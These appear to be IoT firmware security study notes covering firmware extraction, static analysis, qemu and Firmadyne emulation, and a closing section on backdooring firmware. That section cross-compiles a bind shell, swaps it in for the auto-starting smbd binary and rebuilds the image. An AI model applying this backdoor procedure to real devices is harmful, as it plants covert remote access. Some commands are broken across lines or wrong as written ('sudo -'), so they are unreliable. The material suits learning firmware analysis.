# Embedded Linux
Consists of:
- Bootloader
- Kernel
- File System
---
# File System
## File System Types
- SquashFS
- CramFS
- JFFS2
- YAFFS2
- ext2

## Compression Types
Usually IoT devices have limited storage and thus most of the time a compression algorithm is used in combination with the file systems mentioned above.


## Extracting file system from Firmware
> firmware = bootloader data + kernel data + file system 

### Identify Firmware type
#### Manual
Run the **file** utility to identify the file system type, architecture, etc ...
```bash
file firmware.bin
```

In Linux IoT devices the magic header of the file system is used to indicate the beginning of the file system section in the firmware. For example the SquashFS file system has the magic bytes "hsqs" at the beginning of the file system data. 

Use **hexdump** to dump the ascii representation of the firmware and identify the offset of the SquashFS magic bytes in the firmware.

```bash
hexdump -C RT-N300_3.0.0.4_378_9316-gb927772.trx | grep -i "hsqs"
```

![](/Screenshots/Pasted%20image%2020220613024231.png)

Use dd to skip the first 0x000e2100 (the offset till the magic header of the SquashFS file system) bytes of the file and craft out the rest of the firemware into a file. The resulting file is a SquashFS file.

```bash
# evaluate expression
# $((1 + 1)) 
dd if=RT-N300_3.0.0.4_378_9316-gb927772.trx bs=1 skip=$((0x000e2100)) of=  
RT-N300_3.0.0.4_378_9316-gb927772.fs
```

Using the SquashFS utilities extract the file system contents

```bash
unsquashfs RT-N300_3.0.0.4_378_9316-gb927772.fs
```

#### Automated
Binwalk does the manual method but has a more exhaustive list of magic headers. It has automatic file system identification and extraction feature utilities.

```bash
# Identify sections in firmware
binwalk RT-N300_3.0.0.4_378_9316-gb927772.trx

# Identify Firmware Entropy
binwalk -E RT-N300_3.0.0.4_378_9316-gb927772.trx

# Identify and Extract sections from Firmware recursively
binwalk -e -M RT-N300_3.0.0.4_378_9316-gb927772.trx
```

> NB. high entropy in firmware could be an indicator that the firmware is encrypted. 

## Static Analysis
### Manual
- Look for Private keys, certificates, weak default passwords. Some interesting files to look at
	- /etc/shadow
-  Look for custom binaries and identify if binary exploitation could used to escelate privileges
- Reverse engineer web application and applications on the file system.

### Automated
**firmwalker** is a simple bash script for searching the extracted or mounted firmware file system. It will search through the extracted or mounted firmware file system for things of intere
```bash
./firmwalker.sh ~/labs/Firmware/_netgear_wms5316_2.1.2.bin.extracted/wnc
```

## Dynamic Analysis
## Debug Binaries on the file system
### Identify architecture
Run the **file** utility on the binary to Identify the architecture of the firmware. 
```bash
file bin/busybox
```

![](/Screenshots/Pasted%20image%2020220613035310.png)
Note the architecture from the file command output. The LSB/MSB flags show the endianess of the binary. For a more verbose output use the **readelf** utility. Also, note the endianess of the binary.

```bash
readelf -h bin/busybox
```

### Emulate the binary
Some of the libraries (so files) and dependencies used by the binaries of the firmware don't exist on your linux distro. And some of them are compiled for a different architecture. Use an emulator such as **qemu** to emulate running the binary.

> Using Chroot changes the root dir when running the binaries so the correct libaries and dependencies could be used from the /lib folder. This breaks qemu as it is built for your x86 machine. Hence, qemu tries loading the firmware /lib so files which are built for adifferent architecture. Thus, it breaks so we use the statically linked version of qemu. In that version the libaries are built inside the binary statically.

```bash
which qemu-mips-static

cp /usr/bin/qemu-mips-static .

sudo chroot . /qemu-mips-static bin/busybox id
```

Alternatively, use qemu's -L flag to set the root dir when running the binary

```bash
qemu-mips -L ./squashfs-root/ ./squashfs-root/bin/zcat
```

### Debugging the binary
Check the system calls and library calls  made by the binary using strace and ltrace. Using the **manual** utility we could find the arguments to the system calls and what they mean.
```bash
sudo strace chroot . /qemu-mips-static bin/busybox id

sudo ltrace chroot . /qemu-mips-static bin/busybox id

# Find arguments for the write syscall
man 2 write
```

Run qemu with the -G flag to start remotely debugging the application. And hook into the application with gdb remote debugging.

```bash
sudo chroot . /qemu-mips-static -g 9999 bin/busybox id
```

Run gdb-multiarch to remotely attach to the binary.

```bash
gdb-multiarch bin/busybox

# Inside gdb run
set architecture mips

# Remote attach to binary 
target remote  localhost:9999
```

## Emulating Firmware
- Extract the filesystem from the firmware
- Identify firmware architechure and endianess using the same techniques mentioned in the debugging firmware section.
- To emulate the firmware, Firmadyne will be used.

> FIRMADYNE is an automated and scalable system for performing emulation and dynamic analysis of Linux-based embedded firmware.

### firmadyne initial setup
1. Clone firemadyne and install the packages needed.

```bash
sudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan
git clone --recursive https://github.com/firmadyne/firmadyne.git
```

2. Install PgSql and create a firmadyne user. Use firmadyne as the password, as recommended by the tool’s authors to avoid modifying the boiler plate scripts.

```bash
sudo apt-get install postgresql  
sudo service postgresql start  
sudo -u postgres createuser -P firmadyne

# use 'firmadyne' as the password
```
3. Create a new database and load it with the database schema avail-  
able in the firmadyne repository folder

```bash
sudo -u postgres createdb -O firmadyne firmware
sudo -u postgres psql -d firmware < ./firmadyne/database/schema
```

4. Download the prebuilt binaries for all the FIRMADYNE components by running the download.sh script located in the repository folder.

```bash
cd ./firmadyne; ./download.sh
```

5. Set the FIMWARE_DIR variable to point to the current working repository in the firmadyne.config file located in the same folder. This change allows FIRMADYNE to locate the binaries in the Kali Linux filesystem.

```bash
FIRMWARE_DIR=/opt/firmadyne
```

6. FIRMADYNE includes an automated Python script for extracting the firmware. But to use the script, you must first install Python’s binwalk module
```bash
git clone https://github.com/ReFirmLabs/binwalk.git
cd binwalk
sudo python setup.py install
```
7.  we need two more python packages, which we can install using Python’s pip  
package manager.

```bash
sudo -H pip install git+https://github.com/ahupp/python-magic
sudo -H pip install git+https://github.com/sviehb/jefferson
sudo -H pip install psycopg2
```

### Emulating firmware using firmadyne
**Note this was tested on Debian 11**

1. Switch to super user to ease up the process. As some of the emulation requires access to low level kernel modules. Make sure to use the - flag to reset the enviroment variable to those of root as it will be needed later.
```bash
sudo -
```
2. Use FIRMADYNE’s extractor.py script to extract the firmware from the compressed file.

```bash
sudo python3 ./sources/extractor/extractor.py -b iotgoat -sql 127.0.0.1 -np -nk "IoTGoat-raspberry-pi2.img" images
```

> The -b parameter specifies the name used to store the results of the extraction. The -nk parameter keeps any  Linux kernel included in the firmware from being extracted, which will  speed up the process. The -np parameter specifies that no parallel operation will be performed.

![](/Screenshots/Pasted%20image%2020220624225411.png)

The 1 tag 1 indicates that the extracted images are located at ./images/1.tar.gz

3. Export the FIRMWARE_DIR variable as an enviroment variable. As it will be used by scripts in the next few setps. Next, use the getArch.sh script to automatically identify the firmware’s architecture and store it in the FIRMADYNE database.

```bash
export FIRMWARE_DIR=/opt/firmadyne
./scripts/getArch.sh ./images/1.tar.gz
```

4. Use the tar2db.py and makeImage.sh scripts to store information  from the extracted image in the database and generate a QEMU image that  we can emulate. Provide the tag name with the -i parameter and the location of the extracted firmware with the –f parameter.
```bash
./scripts/tar2db.py -i 1 -f ./images/1.tar.gz
./scripts/makeImage.sh 1
```

5. Set up the host device so it can access and interact with the emulated device’s network interfaces. This means that we need to configure an IPv4 address and the proper network routes. The inferNetwork.sh script can automatically detect the appropriate settings.
```bash
./scripts/inferNetwork.sh 1
```

![](/Screenshots/Pasted%20image%2020220624230949.png)

FIRMADYNE successfully identified an interface with the IPv4 address 192.168.1.1 in the emulated device. 

6. To begin the emulation  and set up the host device’s network configuration, use the run.sh script, which is automatically created in the ./scratch/1/ folder
```bash
./scratch/1/run.sh
```

## Backdooring firmware
1. Identify endinaness and architechure of firmware using any of the previously disccused methods.
2. To compile the backdoor agent, we first need to set up the compilation environment. The easiest way is to use the OpenWrt project’s frequently updated toolchain.  

> [OpenWRT's tool chain installation guide](https://openwrt.org/docs/guide-developer/toolchain/use-buildsystem#build_system_usage)

```bash
# Download and update the sources
git clone https://git.openwrt.org/openwrt/openwrt.git
cd openwrt
git pull
 
# Select a specific code revision
git branch -a
git tag
git checkout v21.02.3
 
# Update the feeds
./scripts/feeds update -a
./scripts/feeds install -a
 
# Configure the firmware image and the kernel
make menuconfig
make -j $(nproc) kernel_menuconfig
 
# Build the firmware image
make -j $(nproc) defconfig download clean world
```

3. By default, these commands will compile the firmware for the Atheros AR7 type of System on a Chip (SoC) routers, which are based on MIPS processors. To set a different value, click Target System and choose one of the available Atheros AR7 devices.

![](/Screenshots/Pasted%20image%2020220625173837.png)

Then save your changes to a new configuration file by clicking the SAVE  
option, and exit from the menu by clicking the EXIT option

4. Move a C bindshell to OpenWrt's directory. You can use [this sample C Linux Bindshell](/Code%20Snippets/C%20Linux%20Bind%20Shell.md)

5. In OpenWrt’s staging_dir/toolchain-mips_24kc_gcc-8.4.0_musl/bin/mips-openwrt-linux-musl-gcc, you’ll find the mips-openwrt-linux-gcc compiler, which you can use as follows:

```bash
export STAGING_DIR=/opt/openwrt/staging_dir
./staging_dir/toolchain-mips_24kc_gcc-8.4  
.0_musl/bin/mips-openwrt-linux-gcc bindshell.c -o bindshell -static -EB -march=24kc
```

6. Clone and install firmware-mod-kit to unpack the firmware.
```bash
git clone https://github.com/rampageX/firmware-mod-kit
cd firmware-mod-kit
./extract-firmware.sh Dlink_firmware.bin
```

7. For the attack to be successful, the firmware should replace an existing binary that runs automatically, guaranteeing that any normal use of the device will trigger the backdoor. During the dynamic analysis phase, we indeed identified a binary like that: an SMB service running at port 445. You can find the smbd binary in the /userfs/bin/smbd directory. Let’s replace it with the bindshell.

```bash
cp bindshell /userfs/bin/smbd
```

8. After replacing the binary, reconstruct the firmware using the build firmware script
```bash
./build-firmware.sh
```
